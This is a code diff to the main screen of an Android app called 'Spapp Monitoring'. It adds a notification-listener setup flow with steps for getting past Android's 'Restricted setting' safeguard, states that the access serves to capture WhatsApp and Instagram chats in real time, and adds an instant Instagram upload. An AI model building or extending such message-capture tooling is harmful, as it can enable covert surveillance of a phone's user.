@@ -145,12 +145,35 @@ class MainActivity : AppCompatActivity() {
             openAutostartSettings()
         }
 
+        binding.btnEnableNotification.setOnClickListener {
+            androidx.appcompat.app.AlertDialog.Builder(this)
+                .setTitle("Enable Notification Access")
+                .setMessage("1. In the next screen, find 'Spapp Monitoring' and toggle it ON.\n\n2. Note: If Android shows 'Restricted setting', tap 'Open App Info', click the 3 dots in the top-right corner, and tap 'Allow restricted settings'.")
+                .setPositiveButton(R.string.go_to_settings) { _, _ ->
+                    try {
+                        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Cannot open notification listener settings", e)
+                    }
+                }
+                .setNeutralButton(R.string.open_app_info) { _, _ ->
+                    openAppInfoSettings()
+                }
+                .setNegativeButton(android.R.string.cancel, null)
+                .show()
+        }
+
+        binding.btnOpenAppInfoNotification.setOnClickListener {
+            openAppInfoSettings()
+        }
+
         // Kept available in every build, not just debug — on OEM ROMs (MIUI in
         // particular) the periodic WorkManager schedule and FCM pushes are both
         // unreliable in the background even with battery exemption granted, so
         // the admin/user needs a manual way to force an immediate sync.
         binding.btnSyncNow.setOnClickListener {
             com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
             SyncScheduler.runOnce(applicationContext)
         }
     }
@@ -265,6 +288,16 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun isNotificationAccessGranted(): Boolean {
+        return try {
+            val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+            listeners?.contains(packageName) == true ||
+                    androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
+        } catch (_: Exception) {
+            false
+        }
+    }
+
     private fun refreshPermissionButtons() {
         // Accessibility Service Status
         val isSettingEnabled = AccessibilityStatus.isEnabled(this)
@@ -287,6 +320,37 @@ class MainActivity : AppCompatActivity() {
             binding.btnEnableAccessibility.text = getString(R.string.enable_accessibility)
             binding.btnEnableAccessibility.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.accent))
             binding.btnOpenAppInfo.visibility = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) android.view.View.VISIBLE else android.view.View.GONE
+        }
+
+        // Notification Access Status
+        val isNotifGranted = isNotificationAccessGranted()
+        val isNotifRunning = com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance != null
+        val isNotifActive = isNotifGranted && isNotifRunning
+
+        if (isNotifActive) {
+            binding.tvNotificationBadge.text = "ACTIVE ✓"
+            binding.tvNotificationBadge.setTextColor(androidx.core.content.ContextCompat.getColor(this, R.color.success))
+            binding.tvNotificationBadge.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.success_bg))
+            binding.tvNotificationDesc.text = "Notification Listener is active and monitoring messages."
+            binding.btnEnableNotification.text = "Notification Access Active (Tap to re-check)"
+            binding.btnEnableNotification.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.primary))
+            binding.btnOpenAppInfoNotification.visibility = android.view.View.GONE
+        } else if (isNotifGranted) {
+            binding.tvNotificationBadge.text = "CONNECTED ✓"
+            binding.tvNotificationBadge.setTextColor(androidx.core.content.ContextCompat.getColor(this, R.color.success))
+            binding.tvNotificationBadge.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.success_bg))
+            binding.tvNotificationDesc.text = "Notification Access is granted in system settings."
+            binding.btnEnableNotification.text = "Notification Access Granted"
+            binding.btnEnableNotification.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.primary))
+            binding.btnOpenAppInfoNotification.visibility = android.view.View.GONE
+        } else {
+            binding.tvNotificationBadge.text = "NOT ENABLED ✕"
+            binding.tvNotificationBadge.setTextColor(androidx.core.content.ContextCompat.getColor(this, R.color.danger))
+            binding.tvNotificationBadge.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.danger_bg))
+            binding.tvNotificationDesc.text = "Required to capture WhatsApp and Instagram chat messages and alerts in real-time."
+            binding.btnEnableNotification.text = "Enable Notification Access"
+            binding.btnEnableNotification.setBackgroundColor(androidx.core.content.ContextCompat.getColor(this, R.color.accent))
+            binding.btnOpenAppInfoNotification.visibility = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) android.view.View.VISIBLE else android.view.View.GONE
         }
 
         val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
